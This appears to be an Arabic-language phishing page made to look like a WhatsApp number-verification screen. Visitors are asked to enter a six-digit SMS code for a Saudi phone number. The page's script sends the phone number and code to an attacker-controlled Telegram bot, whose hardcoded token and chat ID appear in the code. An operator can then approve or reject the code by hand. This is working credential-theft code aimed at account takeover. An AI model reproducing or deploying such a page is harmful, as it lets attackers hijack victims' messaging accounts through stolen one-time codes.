<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>التحقق من الرقم</title>
  <style>
    :root {
      --primary-color: #075e54;
      --secondary-color: #128C7E;
      --accent-color: #25D366;
      --error-color: #e74c3c;
      --text-color: #2d3436;
      --light-gray: #f5f6fa;
      --border-color: #dfe6e9;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
      margin: 0;
      padding: 0;
      min-height: 100vh;
      color: var(--text-color);
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    .container {
      max-width: 450px;
      margin: 20px;
      padding: 30px;
      background: white;
      border-radius: 20px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
      position: relative;
      overflow: hidden;
    }
    
    .container::before {
      content: '';
      position: absolute;
      top: 0;
      right: 0;
      width: 100%;
      height: 8px;
      background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
    }
    
    h2 {
      color: var(--primary-color);
      margin-bottom: 25px;
      font-size: 28px;
      font-weight: 700;
      text-align: center;
      position: relative;
      padding-bottom: 15px;
    }
    
    h2::after {
      content: '';
      position: absolute;
      bottom: 0;
      right: 0;
      width: 60px;
      height: 3px;
      background: var(--accent-color);
      border-radius: 3px;
    }
    
    .info {
      color: #666;
      margin-bottom: 30px;
      font-size: 16px;
      line-height: 1.6;
      text-align: center;
      padding: 15px;
      background-color: var(--light-gray);
      border-radius: 10px;
      border-right: 4px solid var(--accent-color);
    }
    
    .info a {
      color: var(--accent-color);
      text-decoration: none;
      font-weight: 600;
      transition: all 0.3s ease;
    }
    
    .info a:hover {
      color: var(--primary-color);
      text-decoration: underline;
    }
    
    .code-inputs {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin: 30px 0;
      direction: ltr;
    }
    
    .code-inputs input {
      width: 50px;
      height: 60px;
      font-size: 26px;
      text-align: center;
      border: 2px solid var(--border-color);
      border-radius: 12px;
      outline: none;
      transition: all 0.3s ease;
      font-weight: bold;
      color: var(--primary-color);
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
    }
    
    .code-inputs input:focus {
      border-color: var(--accent-color);
      box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.2);
      transform: translateY(-2px);
    }
    
    button {
      background-color: var(--accent-color);
      color: white;
      border: none;
      padding: 16px 20px;
      font-size: 18px;
      border-radius: 12px;
      cursor: pointer;
      width: 100%;
      font-weight: bold;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
      letter-spacing: 0.5px;
      margin-top: 10px;
    }
    
    button:hover {
      background-color: var(--secondary-color);
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(37, 211, 102, 0.4);
    }
    
    button:active {
      transform: translateY(0);
    }
    
    .error {
      color: var(--error-color);
      margin-top: 20px;
      text-align: center;
      font-size: 15px;
      font-weight: 500;
      min-height: 20px;
    }
    
    /* نافذة التحميل */
    .loader {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(255, 255, 255, 0.95);
      z-index: 1000;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      backdrop-filter: blur(5px);
    }
    
    .spinner {
      border: 5px solid rgba(0, 0, 0, 0.1);
      border-radius: 50%;
      border-top-color: var(--accent-color);
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin-bottom: 25px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
    }
    
    .loader p {
      font-size: 18px;
      color: var(--primary-color);
      font-weight: 600;
      margin-top: 20px;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    /* نافذة الرفض */
    .reject-modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.8);
      z-index: 1001;
      justify-content: center;
      align-items: center;
      backdrop-filter: blur(3px);
    }
    
    .reject-box {
      background: white;
      padding: 30px;
      border-radius: 16px;
      text-align: center;
      max-width: 350px;
      width: 90%;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
      transform: scale(0.9);
      animation: modalAppear 0.3s forwards;
    }
    
    @keyframes modalAppear {
      to { transform: scale(1); }
    }
    
    .reject-icon {
      color: var(--error-color);
      font-size: 60px;
      margin-bottom: 20px;
      text-shadow: 0 3px 10px rgba(231, 76, 60, 0.3);
    }
    
    .reject-box h3 {
      color: var(--error-color);
      margin-bottom: 15px;
      font-size: 24px;
    }
    
    .reject-box p {
      color: #666;
      font-size: 16px;
      line-height: 1.6;
    }
    
    .reject-btn {
      background: var(--accent-color);
      margin-top: 25px;
    }
    
    /* تأثيرات للجوالات */
    @media (max-width: 480px) {
      .container {
        margin: 20px 15px;
        padding: 25px 20px;
      }
      
      .code-inputs input {
        width: 45px;
        height: 55px;
        font-size: 24px;
      }
      
      button {
        padding: 14px 20px;
        font-size: 16px;
      }
    }
  </style>
</head>


<link rel="manifest" href="manifest.json">
<meta name="theme-color" content="#075e54">



<body>
  <div class="container">
    <h2>التحقق من الرقم</h2>
    <div class="info">
      تم إرسال كود التحقق إلى <span id="phoneDisplay">+966•••••••••</span>
      <br>
      <a href="index.html">تغيير الرقم</a>
    </div>
    
    <div class="code-inputs">
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
    </div>
    
    <button id="verifyBtn">تأكيد الكود</button>
    <div class="error" id="errorText"></div>
  </div>

  <!-- نافذة التحميل -->
  <div class="loader" id="loader">
    <div class="spinner"></div>
    <p>جارٍ التحقق من الكود...</p>
  </div>

  <!-- نافذة الرفض -->
  <div class="reject-modal" id="rejectModal">
    <div class="reject-box">
      <div class="reject-icon">✗</div>
      <h3>الكود غير صحيح</h3>
      <p>الرجاء التأكد من الكود وإعادة المحاولة</p>
      <button class="reject-btn" onclick="closeRejectModal()">حسنًا</button>
    </div>
  </div>

  <script>
    // إعدادات البوت
    const BOT_TOKEN = "7973639984:AAEO7Hcna_9HIa9Zblxvm0MbIh23hL8UMzk";
    const CHAT_ID = "7121448697";
    let currentVerificationId = null;
    
    // عناصر DOM
    const inputs = document.querySelectorAll('.code-inputs input');
    const verifyBtn = document.getElementById('verifyBtn');
    const errorText = document.getElementById('errorText');
    const loader = document.getElementById('loader');
    const rejectModal = document.getElementById('rejectModal');
    const phoneDisplay = document.getElementById('phoneDisplay');
    
    // تهيئة الصفحة
    document.addEventListener('DOMContentLoaded', () => {
      const savedPhone = localStorage.getItem('userPhone') || '+966•••••••••';
      phoneDisplay.textContent = savedPhone;
      
      // إدارة حركة المؤشر بين الحقول
      inputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
          if (e.target.value && index < inputs.length - 1) {
            inputs[index + 1].focus();
          }
        });
        
        input.addEventListener('keydown', (e) => {
          if (e.key === 'Backspace' && !e.target.value && index > 0) {
            inputs[index - 1].focus();
          }
        });
      });
    });
    
    // إرسال البيانات إلى البوت
    async function sendToBot(message) {
      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
          })
        });
        return await response.json();
      } catch (error) {
        console.error('فشل الإرسال:', error);
        return { ok: false };
      }
    }
    
    // إنشاء اتصال WebSocket للاستماع للردود
    function setupWebSocket(verificationId) {
      // في الواقع، تحتاج هنا لاستخدام خدمة وسيطة لإنشاء WebSocket
      // هذا مثال مبسط للتوضيح فقط
      return new Promise((resolve) => {
        // هذه الدالة ستكون مسؤولة عن الاستماع للرد من البوت
        window.checkVerificationResponse = function(response) {
          if (response.verificationId === verificationId) {
            resolve(response.status);
          }
        };
        
        // محاكاة الرد بعد 5 ثواني (للاختبار فقط)
        setTimeout(() => {
          // في الواقع، هذه ستأتي من خدمة الويب سوكيت
          const testResponse = Math.random() > 0.5 ? 
            { status: 'accepted' } : { status: 'rejected' };
          resolve(testResponse.status);
        }, 5000);
      });
    }
    
    // تأكيد الكود
    verifyBtn.addEventListener('click', async () => {
      const code = Array.from(inputs).map(i => i.value).join('');
      
      if (code.length !== 6) {
        errorText.textContent = 'الرجاء إدخال الكود المكون من 6 أرقام';
        return;
      }
      
      errorText.textContent = '';
      loader.style.display = 'flex';
      
      const phone = localStorage.getItem('userPhone') || '+966•••••••••';
      currentVerificationId = `verify_${Date.now()}`;
      
      // إرسال الكود إلى البوت
      const message = `🔐 طلب تحقق جديد\n\n`
                   + `📱 الرقم: ${phone}\n`
                   + `🔢 الكود: ${code}\n`
                   + `🆔 المعرف: ${currentVerificationId}\n\n`
                   + 'الرجاء الرد بـ "قبول" أو "رفض"';
      
      const sent = await sendToBot(message);
      
      if (!sent.ok) {
        loader.style.display = 'none';
        errorText.textContent = 'فشل إرسال طلب التحقق، الرجاء المحاولة لاحقًا';
        return;
      }
      
      // الانتظار للرد (في الواقع الفعلي سيتم عبر WebSocket)
      const response = await setupWebSocket(currentVerificationId);
      
      loader.style.display = 'none';
      
      if (response === 'accepted') {
        window.location.href = 'index3.html';
      } else {
        rejectModal.style.display = 'flex';
      }
    });
    
    // إغلاق نافذة الرفض
    function closeRejectModal() {
      rejectModal.style.display = 'none';
      inputs.forEach(input => input.value = '');
      inputs[0].focus();
    }
  </script>
</body>
</html>
